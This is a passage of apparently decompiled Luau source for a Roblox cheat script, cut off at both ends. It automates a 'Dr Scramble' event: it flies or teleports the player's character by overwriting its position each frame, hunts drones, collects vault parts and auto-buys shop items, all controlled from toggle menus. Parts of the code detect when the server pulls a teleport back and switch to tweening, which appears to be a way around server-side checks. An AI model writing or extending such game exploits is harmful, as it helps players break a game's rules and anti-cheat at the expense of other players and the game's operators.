						return
					end

					tbl40.Link:Disconnect()
					local v26 = tbl40
					local v27 = tbl40
					local v28 = tbl40
					tbl40.Link = nil
					v26.Goal = nil
					v27.Look = nil
					v28.Character = nil
					tbl3.Driving = math.max(0, tbl3.Driving - 1)
					tbl3.Shield("scramble", false)
				end

				fn4(fn17)

				fn53 = function(goal, look)
					local v26 = tbl40
					tbl40.Goal = goal
					v26.Look = look
					local character = localPlayer.Character

					if tbl40.Link and tbl40.Character ~= character then
						fn17()
						local v27 = tbl40
						tbl40.Goal = goal
						v27.Look = look
					end

					if tbl40.Link or not character then
						return
					end

					if not tbl3.Swapped() then
						tbl3.Shield("scramble", true)
						tbl40.SwapWait = tbl40.SwapWait or os.clock() + 6
						local swapWait = tbl40.SwapWait
						if os.clock() < swapWait then
							str2 = "Waiting for the character to settle"
							return
						end
					end

					if tbl40.SwapWait then
						tbl40.SwapWait = nil
					else
						tbl3.Shield("scramble", true)
					end

					tbl40.Character = character
					tbl3.Driving = tbl3.Driving + 1

					tbl40.Link = RunService.Heartbeat:Connect(function(deltaTime)
						local v27 = tbl3.Root()
						local goal2 = tbl40.Goal
						if not v27 or not goal2 or v27.Parent ~= tbl40.Character or tbl3.AntiGuard.Busy or tbl3.Movement.Owner ~= "scramble" then
							return
						end
						local position = v27.Position
						local vector

						if Vector3.new(goal2.X - position.X, 0, goal2.Z - position.Z).Magnitude > 250 then
							local n27 = math.max(n25, goal2.Y)
							vector = position.Y < n27 - 2 and Vector3.new(position.X, n27, position.Z) or Vector3.new(goal2.X, n27, goal2.Z)
						else
							vector = goal2
						end

						local n27 = vector - position
						local n28 = n17 * deltaTime
						local n29 = n27.Magnitude <= n28 and vector or position + n27.Unit * n28
						local look2 = tbl40.Look or goal2
						local vector2 = Vector3.new(look2.X - n29.X, 0, look2.Z - n29.Z)
						local cframe = vector2.Magnitude > 0.05 and CFrame.lookAt(Vector3.zero, vector2.Unit) or v27.CFrame.Rotation

						pcall(function()
							v27.CFrame = CFrame.new(n29) * cframe
							v27.AssemblyLinearVelocity = Vector3.zero
							v27.AssemblyAngularVelocity = Vector3.zero
						end)
					end)
				end
			end
		end

		do
			local function fn54(arg)
				if typeof(arg) ~= "Instance" or not arg:IsA("Tool") then
					return false
				end
				local attribute = arg:GetAttribute("GearName")
				local gears = tbl.Gears
				local directory = type(gears) == "table" and gears.Directory or nil
				local flag5 = type(attribute) == "string" and type(directory) == "table" and directory[attribute] or nil
				return type(flag5) == "table" and (flag5.ToolController == "Slap" or flag5.SlapPower ~= nil)
			end

			local function fn55(arg)
				if typeof(arg) ~= "Instance" or not arg:IsA("Tool") then
					return false
				end

				if tostring(arg:GetAttribute("ItemType")) ~= "Gear" then
					return false
				end
				local str6 = tostring(arg:GetAttribute("GearName") or "")
				if str6 == "" then
					return false
				end
				return string.find(string.lower(str6), "scrambler", 1, true) ~= nil
			end

			local function fn56()
				return localPlayer.Character, localPlayer:FindFirstChildOfClass("Backpack")
			end

			local function fn57()
				local v25 = tbl3.FindBat()
				if v25 then
					return v25
				end
				local v26, v27 = fn56()

				for _, v28 in ipairs({ v26, v27 }) do
					if v28 then
						for _, child in ipairs(v28:GetChildren()) do
							if fn54(child) or fn55(child) then
								return child
							end
						end
					end
				end

				return nil
			end

			tbl33.Valid = function(arg)
				if typeof(arg) ~= "Instance" or not arg:IsA("Tool") then
					return false
				end
				return tbl3.IsBatTool(arg) or fn54(arg) or fn55(arg)
			end

			tbl33.Owned = function(arg)
				if typeof(arg) ~= "Instance" or not arg:IsA("Tool") then
					return false
				end
				local v25, v26 = fn56()
				local parent = arg.Parent
				return parent ~= nil and (parent == v25 or parent == v26)
			end

			tbl33.Name = function(arg)
				if fn55(arg) then
					return "The Scrambler"
				end
				return tostring(arg:GetAttribute("GearName") or arg.Name)
			end

			tbl33.Put = function(arg, arg2, parent)
				local equipAt = tbl33.EquipAt
				if os.clock() - equipAt < 0.4 then
					return false
				end
				tbl33.EquipAt = os.clock()

				pcall(function()
					arg2:EquipTool(arg)
				end)

				if arg.Parent ~= parent then
					pcall(function()
						arg.Parent = parent
					end)
				end

				return arg.Parent == parent
			end

			local function fn58()
				local character = localPlayer.Character
				local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
				if not character or not humanoid or humanoid.Health <= 0 then
					return nil, false
				end
				local tool = character:FindFirstChildWhichIsA("Tool")

				if tool ~= nil and tbl33.Valid(tool) then
					tbl33.Tool = tool
					str3 = tbl33.Name(tool)
					return tool, true
				end

				if not tbl33.Owned(tbl33.Tool) then
					tbl33.Tool = fn57()
				end

				local tool2 = tbl33.Tool
				if not tool2 then
					str3 = ""
					return nil, false
				end
				str3 = tbl33.Name(tool2)
				tbl33.Put(tool2, humanoid, character)
				return tool2, tool2.Parent == character
			end

			local function fn59()
				local v25, v26 = fn58()

				if v25 and v26 then
					pcall(function()
						v25:Deactivate()
						v25:Activate()
					end)
				end

				return v25 ~= nil
			end

			local function fn60(arg, arg2, arg3)
				local now = os.clock()
				local n25 = now + n20

				while os.clock() < n25 and not arg() do
					local v25, v26 = fn52()
					local flag5 = not v26
					local flag6

					if flag5 then
						flag6 = flag5
					elseif arg2 then
						flag6 = (v26.Position - arg2).Magnitude > (arg3 or 40)
					else
						flag6 = arg2
					end

					if flag6 then
						if arg2 and os.clock() - now < 1.2 then
							task.wait(0.1)
							continue
						end
						return
					end

					if fn38() and not fn38(v26.Position) then
						fn17()
						str2 = "Leaving the base through the safe zone"
						if not fn40(v26.Position + Vector3.new(0, 2.5, 0), arg, 6) then
							return
						end
						continue
					end

					str2 = v26.Kind == "Part" and "Picking up a Drone Part" or "Picking up Samples"
					fn53(v26.Position + Vector3.new(0, 2.5, 0), v26.Position)
					local n26 = os.clock() + 2.5

					while tbl24[v25] and os.clock() < n26 and not arg() do
						task.wait(0.1)
					end

					tbl24[v25] = nil
					n25 = os.clock() + 1.2
				end
			end

			local function fn61(arg, arg2)
				local now = os.clock()
				local n25 = tonumber(arg.Health) or 0
				local v25 = nil
				local v26 = nil
				local flag5 = false

				while not arg2() do
					local v27 = tbl23[arg.Id]
					local flag6 = not v27
					local flag7

					if flag6 then
						flag7 = flag6
					else
						flag7 = (tonumber(v27.Health) or 0) <= 0
					end

					if flag7 then
						return true
					end
					local v28 = fn47(arg.Id)
					if v28 and v28:GetAttribute("DroneState") == "Death" then
						tbl23[arg.Id] = nil
						return true
					end
					local v29 = fn32()
					local flag8 = v29 ~= nil and v27.Position ~= nil

					if flag8 then
						flag8 = (v29.Position - (fn49(v27) or v27.Position)).Magnitude <= 30
					end

					if flag8 and not v28 then
						local now2 = v25 or os.clock()
						if os.clock() - now2 > 1.5 then
							tbl23[arg.Id] = nil
							return false
						end
						v25 = now2
					else
						v25 = nil
					end

					local n26 = tonumber(v27.Health) or 0

					if n26 ~= n25 then
						v26 = nil
						n25 = n26
					end

					if n19 < os.clock() - now then
						tbl26[arg.Id] = os.clock() + 30
						return false
					end
					local position = fn49(v27) or v27.Position
					local v30 = fn32()
					if not v30 then
						return false
					end

					if fn38() and not fn38(position) then
						fn17()
						str2 = "Leaving the base through the safe zone"
						if not fn40(position, arg2, 12) then
							return false
						end

						if arg2() then
							return false
						end
					end

					fn53(position + Vector3.new(0, -1, 5), position)

					if (v30.Position - position).Magnitude <= 60 then
						fn58()
					end

					if (v30.Position - position).Magnitude <= n18 then
						local now2 = v26 or os.clock()
						if os.clock() - now2 > 8 then
							tbl26[arg.Id] = os.clock() + 30
							return false
						end

						if fn59() then
							str2 = string.format("Smashing %s  %d HP", v27.Tier ~= "" and v27.Tier or "drone", math.max(0, tonumber(v27.Health) or 0))
							v26 = now2
						elseif not flag5 then
							str2 = "No bat found, get any bat to smash drones"
							flag5 = true
							v26 = now2
						else
							v26 = now2
						end
					else
						str2 = "Flying to a drone"
					end

					task.wait(0.1)
				end

				return false
			end

			local function fn62(arg)
				for _, v25 in ipairs(tbl34) do
					if arg() then
						return false
					end
					str2 = "Looking for drones"
					fn53(v25)
					local n25 = os.clock() + 12

					while os.clock() < n25 and not arg() do
						fn48()
						if #fn50() > 0 then
							return true
						end

						if tbl3.DistanceTo(v25) < 8 then
							break
						end
						task.wait(0.2)
					end
				end

				return #fn50() > 0
			end

			local function fn63()
				local serverTimeNow = workspace:GetServerTimeNow()
				local v25, v26 = fn13()
				if v25 and v26 and v26 < 25 then
					return next(tbl24) ~= nil
				end

				for _, v27 in pairs(tbl24) do
					if v27.Kind == "Part" or v27.ExpiresAt and v27.ExpiresAt - serverTimeNow < 30 then
						return true
					end
				end

				return false
			end

			local v25 = nil

			local function fn64()
				local window = type(snapshot) == "table" and snapshot.Window or nil
				return type(window) == "table" and window.Index or nil
			end

			local function fn65(arg)
				local flag5 = v25 ~= nil and v25 == fn64()

				while not arg() do
					RunService.Heartbeat:Wait()

					if not arg() then
						fn48()

						if fn63() then
							fn60(arg)
						end

						local v26, flag6, flag7, flag8, v27, position, flag9, magnitude, flag10, flag11, flag12, n25, v28, n26, flag13, v29, flag14

						if fn38() then
							fn17()

							if fn39(arg) then
								v26 = fn51()
								flag6 = not v26 and next(tbl24) ~= nil

								if flag6 then
									fn60(arg)
									fn48()
									v26 = fn51()
								end

								if not v26 then
									flag7 = not fn13() or flag5

									if not flag7 then
										v25 = fn64()
										flag8 = true
										flag5 = true

										if not fn62(arg) then
											break
										else
											continue
										end
									end
								else
									v27 = fn49(v26)
									position = v27 or v26.Position
									flag9 = fn32()
									magnitude = flag9 and (flag9.Position - position).Magnitude or 0
									flag10 = str5 == "Teleport"
									flag9 = flag10 and flag9

									if flag9 then
										flag11 = fn38() and not fn38(position)
										flag9 = not flag11
									end

									if flag9 then
										flag12 = magnitude > n18 and magnitude <= n21 and os.clock() >= n23 and os.clock() - n24 >= n22

										if flag12 then
											n24 = os.clock()
											n25 = position + Vector3.new(0, -1, 5)
											fn53(n25, position)
											v28 = fn32()

											if v28 then
												str2 = "Teleporting to the next drone"

												pcall(function()
													v28.CFrame = CFrame.lookAt(n25, Vector3.new(position.X, n25.Y, position.Z))
													v28.AssemblyLinearVelocity = Vector3.zero
													v28.AssemblyAngularVelocity = Vector3.zero
												end)

												n26 = os.clock() + 0.8

												while true do
													flag13 = os.clock() < n26 and not arg()

													if flag13 then
														v29 = fn32()
														flag14 = v29 and (v29.Position - n25).Magnitude > 40

														if flag14 then
															n23 = os.clock() + 30
															str2 = "Teleport pulled back, tweening"
															break
														else
															RunService.Heartbeat:Wait()
															continue
														end
													end

													break
												end
											end
										end
									end

									fn61(v26, arg)
									continue
								end
							end
						else
							v26 = fn51()
							flag6 = not v26 and next(tbl24) ~= nil

							if flag6 then
								fn60(arg)
								fn48()
								v26 = fn51()
							end

							if not v26 then
								flag7 = not fn13() or flag5

								if not flag7 then
									v25 = fn64()
									flag8 = true
									flag5 = true

									if not fn62(arg) then
										break
									else
										continue
									end
								end
							else
								v27 = fn49(v26)
								position = v27 or v26.Position
								flag9 = fn32()
								magnitude = flag9 and (flag9.Position - position).Magnitude or 0
								flag10 = str5 == "Teleport"
								flag9 = flag10 and flag9

								if flag9 then
									flag11 = fn38() and not fn38(position)
									flag9 = not flag11
								end

								if flag9 then
									flag12 = magnitude > n18 and magnitude <= n21 and os.clock() >= n23 and os.clock() - n24 >= n22

									if flag12 then
										n24 = os.clock()
										n25 = position + Vector3.new(0, -1, 5)
										fn53(n25, position)
										v28 = fn32()

										if v28 then
											str2 = "Teleporting to the next drone"

											pcall(function()
												v28.CFrame = CFrame.lookAt(n25, Vector3.new(position.X, n25.Y, position.Z))
												v28.AssemblyLinearVelocity = Vector3.zero
												v28.AssemblyAngularVelocity = Vector3.zero
											end)

											n26 = os.clock() + 0.8

											while true do
												flag13 = os.clock() < n26 and not arg()

												if flag13 then
													v29 = fn32()
													flag14 = v29 and (v29.Position - n25).Magnitude > 40

													if flag14 then
														n23 = os.clock() + 30
														str2 = "Teleport pulled back, tweening"
														break
													else
														RunService.Heartbeat:Wait()
														continue
													end
												end

												break
											end
										end
									end
								end

								fn61(v26, arg)
								continue
							end
						end
					end

					break
				end

				fn60(arg)
				fn17()
			end

			local tbl40 = { LostPart1 = "Mechanical Gear", LostPart2 = "Wiring Harness" }

			tbl3.ScrambleLostPart = function(arg)
				return fn30(fn11(), arg)
			end

			fn18 = function()
				local v26 = fn11()
				if not v26 then
					return "Lost Parts: no event data"
				end
				local drScrambleEvent = workspace:FindFirstChild("DrScrambleEvent")
				local tbl41 = {}
				local n25 = 0
				local n26 = 0

				for _, v27 in ipairs(tbl30) do
					local v28 = drScrambleEvent and drScrambleEvent:FindFirstChild(v27)

					if v28 then
						n25 += 1
					end

					if fn30(v26, v27) then
						n26 += 1
					elseif v28 then
						local ok, result = pcall(v28.GetPivot, v28)
						ok = ok and tbl3.DistanceTo(result.Position) or nil
						tbl41[#tbl41 + 1] = ok and string.format("%s %d studs", tbl40[v27], math.floor(ok)) or tbl40[v27]
					else
						tbl41[#tbl41 + 1] = tbl40[v27] .. " not on map"
					end
				end

				local str6 = string.format("Lost Parts on map %d/2  -  Collected %d/2", n25, n26)

				if #tbl41 > 0 then
					str6 ..= "  -  " .. table.concat(tbl41, "  -  ")
				end

				return str6
			end

			local function fn66(arg)
				if not fn37() then
					return true
				end
				local Exit = fn35("Exit")
				local v26 = fn36(Exit, nil)
				if not v26 then
					return false
				end
				str2 = "Leaving the Secret Cave"
				if not fn33(v26, arg, 4) then
					return false
				end

				for i = 1, 4 do
					if arg() then
						return false
					end
					fn34(Exit or fn35("Exit"))
					local n25 = os.clock() + 1.5

					while os.clock() < n25 and fn37() do
						RunService.Heartbeat:Wait()
					end

					if not fn37() then
						return true
					end
				end

				return not fn37()
			end

			local function fn67()
				return tbl3.IsNight() or tbl3.WallSealed()
			end

			local function fn68(arg)
				if not fn67() then
					return true
				end
				fn17()

				while fn67() and not arg() do
					str2 = tbl3.IsNight() and "Night, waiting for the wall to drop" or "Waiting for the wall to drop"
					RunService.Heartbeat:Wait()
				end

				return not arg()
			end

			fn19 = function()
				if not tbl3.Toggle(v21, false) or not fn12() then
					return false
				end

				if tbl25.Ended then
					return false
				end

				if tbl3.Toggle(v24, false) then
					local v26 = fn11()
					local flag5 = not v26 or v26.Completed == true
					local flag6

					if flag5 then
						flag6 = flag5
					else
						flag6 = (tonumber(v26.DroneParts) or 0) >= 3
					end

					if flag6 then
						return next(tbl24) ~= nil
					end
				end

				if fn13() then
					return true
				end
				fn48()
				return #fn50() > 0 or next(tbl24) ~= nil
			end

			fn20 = function()
				local v26 = fn11()
				if not v26 or v26.Completed == true or not fn12() then
					return false
				end
				local num = tonumber(v26.TotalParts)

				if not num then
					num = fn31(v26) + (tonumber(v26.DroneParts) or 0)
				end

				local flag5 = tbl3.Toggle(v22, false)

				if flag5 then
					local n25 = #tbl30
					flag5 = fn31(v26) < n25
				end

				local flag6 = tbl3.Toggle(v23, false) and (num >= 5 or v26.Discovered ~= true)
				return flag5 or flag6
			end

			fn21 = function(arg)
				local function fn69()
					return arg ~= n13 or tbl3.Movement.Owner ~= "scramble"
				end

				local function fn70()
					return fn69() or not fn19() or fn67()
				end

				while true do
					if fn19() and not fn69() then
						if fn68(fn69) then
							pcall(fn65, fn70)
							if fn67() then
								continue
							end
						end
					end

					break
				end

				fn17()
				if fn69() or fn19() then
					return
				end

				if not fn20() then
					fn41(fn69)
					str2 = ""
					return
				end

				if not fn68(fn69) then
					return
				end
				fn10(true)
				local v26 = fn11()
				if not v26 then
					return
				end

				if not fn20() then
					str2 = ""
					return
				end

				if tbl3.Toggle(v23, false) and v26.Discovered ~= true then
					pcall(fn43, fn69)
				end

				if tbl3.Toggle(v22, false) then
					pcall(fn44, function()
						return fn69() or not tbl3.Toggle(v22, false) or fn19() or fn67()
					end)
				end

				if tbl3.Toggle(v23, false) then
					pcall(fn45, function()
						return fn69() or not tbl3.Toggle(v23, false) or fn19() or fn67()
					end)
				end

				if fn37() and not fn69() then
					pcall(fn66, fn69)
				end

				if not fn37() and not fn19() then
					pcall(fn41, fn69)
				end
			end
		end

		fn22 = function(arg)
			if not (tbl3.Treadmill.Riding or tbl3.OnBelt()) then
				return true
			end

			for i = 1, 3 do
				if arg() then
					return false
				end
				str2 = "Jumping off the treadmill"
				tbl3.Treadmill.Riding = false
				task.spawn(tbl3.LeaveBelt)
				local character = localPlayer.Character
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")

				if humanoid then
					pcall(function()
						humanoid.Sit = false
						humanoid.Jump = true
						humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
					end)
				end

				local v25 = fn32()

				if v25 then
					local position = v25.Position
					local n25 = position + Vector3.new(0, 18, 0)
					local now = os.clock()

					while true do
						RunService.Heartbeat:Wait()
						local v26 = fn32()

						if not v26 then
							break
						else
							local n26 = math.min(1, (os.clock() - now) / 0.25)

							pcall(function()
								local rotation = v26.CFrame.Rotation
								v26.CFrame = CFrame.new(position:Lerp(n25, n26)) * rotation
								v26.AssemblyLinearVelocity = Vector3.zero
								v26.AssemblyAngularVelocity = Vector3.zero
							end)

							if not (n26 >= 1) then
								continue
							end
							break
						end
					end
				end

				if not (tbl3.Treadmill.Riding or tbl3.OnBelt()) then
					return true
				end
			end

			return not tbl3.OnBelt()
		end

		fn23 = function()
			if flag3 or not tbl3.ClaimMovement("scramble") then
				return
			end
			flag3 = true
			n13 += 1
			local v25 = n13

			local function fn54()
				return v25 ~= n13 or tbl3.Movement.Owner ~= "scramble"
			end

			fn22(fn54)
			tbl3.HoldBelt()

			pcall(function()
				fn10(false)
				fn42(fn54)
			end)

			str2 = ""
			tbl3.ReleaseBelt()
			tbl3.ReleaseMovement("scramble")
			tbl33.Tool = nil
			tbl33.EquipAt = 0
			flag3 = false
			tbl2.Wake()
		end

		v17 = v9:CreateText({ Name = "Scramble Status", Text = "Loading Dr Scramble data..." })

		v21 = v9:CreateToggle({
			Name = "Auto Hunt Drones",
			Note = "Kill drones during outbreaks for Samples and Drone Parts",
			Default = false,
			Callback = function()
				n13 += 1
				str2 = ""
				n14 = 0
				tbl2.Wake()
			end,
		})

		v9:CreateDropdown({
			Name = "Hunt Priority",
			Options = tbl37,
			Default = tbl37[1],
			SubOf = v21,
			Callback = function(arg)
				str4 = tostring(arg)
			end,
		})

		fn5(v9:CreateMultiDropdown({
			Name = "Drone Types",
			Options = tbl36,
			Default = tbl36,
			SubOf = v21,
			Callback = function(arg)
				local tbl40 = {}

				if type(arg) == "table" then
					for k, v25 in pairs(arg) do
						k = v25 == true and type(k) == "string" and k or type(v25) == "string" and v25 or nil

						for _, v26 in ipairs(tbl35) do
							if v26.Label == k then
								tbl40[v26.Tier] = true
							end
						end
					end
				end

				tbl38 = tbl40
			end,
		}))

		v9:CreateDropdown({
			Name = "Hunt Travel Method",
			Note = "Teleport only to drones within 110 studs, farther ones are tweened",
			Options = tbl39,
			Default = tbl39[1],
			SubOf = v21,
			Callback = function(arg)
				str5 = tostring(arg)
			end,
		})

		v9:CreateSlider({
			Name = "Hunt Tween Speed",
			Min = 100,
			Max = 1000,
			Default = 400,
			Increment = 10,
			Unit = "studs/s",
			SubOf = v21,
			Callback = function(arg)
				n17 = math.clamp(tonumber(arg) or 400, 100, 1000)
			end,
		})

		v24 = v9:CreateToggle({
			Name = "Only Until Vault Parts Found",
			Default = false,
			SubOf = v21,
			Callback = function()
				tbl2.Wake()
			end,
		})

		v22 = v9:CreateToggle({
			Name = "Auto Collect Lost Parts",
			Note = "Collect the 2 Lost Parts for the vault",
			Default = false,
			Callback = function()
				n13 += 1
				str2 = ""
				n14 = 0
				tbl2.Wake()
			end,
		})

		v18 = v9:CreateText({ Name = "Lost Parts Status", Text = "Checking the map..." })

		v23 = v9:CreateToggle({
			Name = "Auto Open Vault",
			Note = "Open the vault when all 5 parts are found",
			Default = false,
			Callback = function()
				n13 += 1
				str2 = ""
				n14 = 0
				tbl2.Wake()
			end,
		})

		v19 = v9:CreateToggle({
			Name = "Auto Buy Scramble Shop",
			Note = "Buy the picked items with Samples",
			Default = false,
			Callback = function()
				n14 = 0
				tbl2.Wake()
			end,
		})

		fn5(v9:CreateMultiDropdown({
			Name = "Scramble Shop Items",
			Options = tbl31,
			Default = { "Experiment #001", "Nibbles #013", "Scrambled Mutation" },
			SubOf = v19,
			Callback = function(arg)
				local tbl40 = {}

				if type(arg) == "table" then
					for k, v25 in pairs(arg) do
						if v25 == true and type(k) == "string" then
							tbl40[k] = true
						elseif type(v25) == "string" then
							tbl40[v25] = true
						end
					end
				end

				tbl32 = tbl40
			end,
		}))

		v9:CreateSlider({
			Name = "Keep Samples",
			Min = 0,
			Max = 10000,
			Default = 0,
			Increment = 25,
			Unit = "",
			SubOf = v19,
			Callback = function(arg)
				n11 = math.max(0, tonumber(arg) or 0)
			end,
		})

		tbl27 = { "Highest Value", "Best Rarity", "Biggest Size" }
		tbl28 = { idle = "#8C93A6", work = "#FFC857", good = "#57E08A", stop = "#FF6B6B" }

		do
			local n25 = 6

			tbl29 = {
				Handle = nil,
				BuyHandle = nil,
				Loop = 0,
				MinRarity = 0,
				MinIncome = 0,
				Priority = tbl27[1],
				SkipMutated = true,
				Targets = {},
				Cooldown = 0,
				Status = "Idle",
				State = "idle",
				Detail = "Turn it on to start applying Scrambled",
				RarityColor = "#FFFFFF",
				Icon = "",
				Ui = {},
				Row = nil,
				Left = 0,
				Pen = 0,
				Match = 0,
				Tries = 0,
				Hits = 0,
				Locked = nil,
				Short = false,
				EggOptions = {},
				EggCategory = {},
			}

			local directory = tbl.Assets and tbl.Assets.Directory
			local tbl40 = {}

			if type(directory) == "table" then
				for k, v25 in pairs(directory) do
					local rarity = type(v25) == "table" and v25.Rarity or nil
					local flag5 = type(rarity) == "table"

					if flag5 then
						flag5 = tonumber(rarity.RarityNumber or rarity.Rank)
					end

					flag5 = flag5 or nil

					if flag5 then
						table.insert(tbl40, {
							Category = tostring(k),
							Name = tostring(v25.DisplayName or k),
							Rarity = flag5,
							RarityName = tostring(rarity.DisplayName or rarity._id or flag5),
						})
					end
				end
			end

			table.sort(tbl40, function(arg, arg2)
				if arg.Rarity ~= arg2.Rarity then
					return arg.Rarity > arg2.Rarity
				end
				return arg.Name < arg2.Name
			end)

			for _, v25 in ipairs(tbl40) do
				local str6 = string.format("%s [%s]", v25.Name, v25.RarityName)

				if tbl29.EggCategory[str6] then
					str6 = string.format("%s [%s] (%s)", v25.Name, v25.RarityName, v25.Category)
				end

				table.insert(tbl29.EggOptions, str6)
				tbl29.EggCategory[str6] = v25.Category
			end

			fn24 = function(arg)
				local directory2 = tbl.Assets and tbl.Assets.Directory
				return type(directory2) == "table" and directory2[tostring(arg)] or nil
			end

			fn25 = function(arg)
				local v25 = fn24(arg.AssetCategory)
				local rarity = type(v25) == "table" and v25.Rarity or nil
				local flag5 = type(rarity) == "table"
				local num

				if flag5 then
					num = tonumber(rarity.RarityNumber or rarity.Rank)
				else
					num = flag5
				end

				return num or 0
			end

			fn26 = function(arg)
				local v25 = fn24(arg.AssetCategory)
				local n26 = type(v25) == "table" and tonumber(v25.EarningRate) or 0
				local n27 = tonumber(arg.AssetScale) or 0
				if n26 <= 0 or n27 <= 0 then
					return 0
				end
				return n26 * (n27 > 5 and (n27 / 5) ^ 1.2 * 19.637875755794113 or n27 ^ 1.85)
			end

			fn27 = function(arg)
				if tostring(arg.BaseMutation or "") == "Scrambled" then
					return true
				end

				if type(arg.Mutations) == "table" then
					for k, mutation in pairs(arg.Mutations) do
						if type(mutation) == "string" and mutation == "Scrambled" then
							return true
						end

						if type(k) == "string" and k == "Scrambled" and mutation ~= false then
							return true
						end
					end
				end

				return false
			end

			fn28 = function()
				local eggState = tbl.EggState
				if type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
					return {}
				end
				local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
				if not ok or type(result) ~= "table" then
					return {}
				end
				local tbl41 = {}

				for k, v25 in pairs(result) do
					if type(v25) == "table" and v25.Placement ~= nil then
						v25.Uid = v25.Uid or k
						tbl41[#tbl41 + 1] = v25
					end
				end

				return tbl41
			end

			local function fn54(arg)
				arg = arg and arg.Uid

				if arg then
					local areaEggSlotsClient = workspace:FindFirstChild("AreaEggSlotsClient")
					local v25 = areaEggSlotsClient and areaEggSlotsClient:FindFirstChild(arg)

					if v25 then
						local ok, result = pcall(function()
							return v25:GetPivot().Position
						end)

						if ok and typeof(result) == "Vector3" then
							return result
						end
					end
				end

				if type(tbl3.PenAnchor) == "function" then
					local ok, result = pcall(tbl3.PenAnchor)
					if ok and typeof(result) == "Vector3" then
						return result
					end
				end

				return nil
			end

			fn29 = function(arg, arg2)
				local v25 = fn54(arg)
				if v25 == nil then
					return true
				end

				if tbl3.DistanceTo(v25) <= n25 then
					return true
				end

				local function fn55()
					if arg2 ~= tbl29.Loop or not tbl3.Toggle(tbl29.Handle, false) then
						return true
					end

					if tbl3.Movement.PlaceWanted == true then
						return true
					end
					return tbl3.Movement.ScrambleWanted == true or tbl3.Steal.Wanted == true
				end

				if tbl3.Treadmill.Riding or tbl3.OnBelt() then
					tbl3.ExitBelt()
				end

				tbl3.HoldBelt()
				local ok, result = pcall(tbl3.FlyTo, v25 + Vector3.new(0, 3, 0), fn55, "mutation")
				tbl3.ReleaseBelt()
				tbl3.LeaveBelt()
				result = ok and result

				if result then
					local n26 = n25 + 4
					result = tbl3.DistanceTo(v25) <= n26
				end

				return result
			end
		end

		v20 = fn46
	end

	do
		local function fn30(arg)
			if not arg then
				return 0
			end
			local num = tonumber(arg:GetAttribute("Uses"))
			if num ~= nil then
				return num
			end
			local v21 = string.match(arg.Name, "%[X(%d+)%]")
			return tonumber(v21) or 1
		end

		local function fn31()
			local v21 = v20()
			if not v21 then
				return nil, 0
			end
			local v22 = fn30(v21)
			if v22 <= 0 then
				return nil, 0
			end
			return v21, v22
		end

		tbl29.Grip = function(arg)
			local character = localPlayer.Character
			local humanoid = character and character:FindFirstChildOfClass("Humanoid")
			if not character or not humanoid or not arg or arg.Parent == nil then
				return false
			end

			if arg.Parent ~= character then
				pcall(function()
					humanoid:EquipTool(arg)
				end)

				if arg.Parent ~= character then
					pcall(function()
						arg.Parent = character
					end)
				end

				task.wait(0.2)
			end

			return arg.Parent == character
		end

		local function fn32()
			if not tbl3.Toggle(tbl29.BuyHandle, false) or flag4 then
				return false
			end
			flag4 = true
			local flag5 = false

			local ok, result = pcall(function()
				flag5 = tbl29.Purchase()
			end)

			flag4 = false

			if not ok then
				tbl29.Status = "Buy failed: " .. tostring(result)
			end

			return flag5
		end

		tbl29.Purchase = function()
			local n16 = 0
			local short = false

			for i = 1, 10 do
				local flag5 = n16 == 0 and fn10(true) or snapshot
				local v21 = fn11()

				if not (type(flag5) ~= "table" or type(v21) ~= "table") then
					local v22, v23, v24 = ipairs(type(flag5.Shop) == "table" and flag5.Shop or {})
					local v25 = nil

					for _, v26 in v22, v23, v24 do
						if type(v26) == "table" and v26.Id == "MutationConsumable" then
							v25 = v26
						end
					end

					if v25 then
						local num = tonumber(v25.PurchaseLimit)

						if not (num and fn15(v21, v25) >= num) then
							local huge = tonumber(v25.Price) or math.huge

							if (tonumber(v21.Samples) or 0) - huge < n11 then
								short = true

								if n16 == 0 then
									tbl29.Status = "Need " .. tostring(math.floor(huge)) .. " Samples"
								end

								break
							else
								local Shop = fn9("Shop", v25.Id, { Quote = v25.Quote, Sequence = tonumber(v21.ShopSequence) or 0 })

								if not (type(Shop) ~= "table" or Shop.Ok ~= true) then
									n16 += 1
									task.wait(0.4)
									continue
								end
							end
						end
					end
				end

				break
			end

			if n16 > 0 then
				tbl29.Status = string.format("Bought %d Scrambled", n16)
				tbl29.Short = short
				return true
			end

			tbl29.Short = short
			return false
		end

		local function fn33()
			local pen = 0
			local match = 0
			local n16 = -1
			local v21 = nil

			for _, v22 in ipairs(fn28()) do
				pen += 1
				local skipMutated = tbl29.SkipMutated and fn27(v22)
				local flag5 = false

				if skipMutated then
					flag5 = true
				end

				local flag6 = not flag5
				local flag7

				if flag6 then
					local minRarity = tbl29.MinRarity
					flag7 = fn25(v22) < minRarity
				else
					flag7 = flag6
				end

				if flag7 then
					flag5 = true
				end

				local flag8 = not flag5 and tbl29.MinIncome > 0

				if flag8 then
					local minIncome = tbl29.MinIncome
					flag8 = fn26(v22) < minIncome
				end

				if flag8 then
					flag5 = true
				end

				if not flag5 and next(tbl29.Targets) ~= nil and tbl29.Targets[tostring(v22.AssetCategory)] ~= true then
					flag5 = true
				end

				if not flag5 then
					match += 1
					local n17

					if tbl29.Priority == tbl27[2] then
						n17 = fn25(v22) * 1000 + (tonumber(v22.AssetScale) or 0)
					elseif tbl29.Priority == tbl27[3] then
						n17 = tonumber(v22.AssetScale) or 0
					else
						n17 = fn26(v22)
					end

					local flag9 = n17 > n16

					if not flag9 and v21 ~= nil and n17 == n16 and v22.Uid == tbl29.Locked then
						n16 = n17
						v21 = v22
					elseif flag9 then
						n16 = n17
						v21 = v22
					end
				end
			end

			local v22 = tbl29
			tbl29.Pen = pen
			v22.Match = match
			return v21
		end

		local function fn34(arg)
			if typeof(arg) ~= "Color3" then
				return "#FFFFFF"
			end
			local floor = math.floor
			local n16 = arg.B * 255 + 0.5
			return string.format("#%02X%02X%02X", math.floor(arg.R * 255 + 0.5), math.floor(arg.G * 255 + 0.5), floor(n16))
		end

		local function fn35(arg)
			local ok, result = pcall(Color3.fromHex, arg)
			if not ok or typeof(result) ~= "Color3" then
				return arg
			end
			local v21, v22, v23 = result:ToHSV()
			return fn34(Color3.fromHSV(v21, math.min(v22, 0.78), math.max(v23, 0.82)))
		end

		local function fn36(arg)
			local v21 = fn24(arg and arg.AssetCategory)
			local icon = type(v21) == "table" and v21.Icon or nil
